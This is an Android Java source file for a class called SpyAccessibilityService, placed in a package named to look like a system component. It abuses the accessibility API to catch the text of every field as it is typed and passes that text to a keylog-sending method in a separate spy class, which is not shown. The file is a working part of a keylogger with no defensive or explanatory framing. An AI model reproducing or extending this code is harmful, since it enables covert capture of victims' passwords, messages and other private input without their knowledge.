package com.system.phantom;

import android.accessibilityservice.*;
import android.view.accessibility.*;

public class SpyAccessibilityService extends AccessibilityService {
    private static SpyService spy;

    public static void setSpyService(SpyService s) { spy = s; }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo s = e.getSource();
            if (s != null && s.getText() != null && s.getText().length() > 0 && spy != null) {
                spy.sendKeylog(s.getText().toString());
            }
        }
    }

    @Override public void onInterrupt() {}

    @Override protected void onServiceConnected() {
        AccessibilityServiceInfo i = new AccessibilityServiceInfo();
        i.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        i.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(i);
    }
}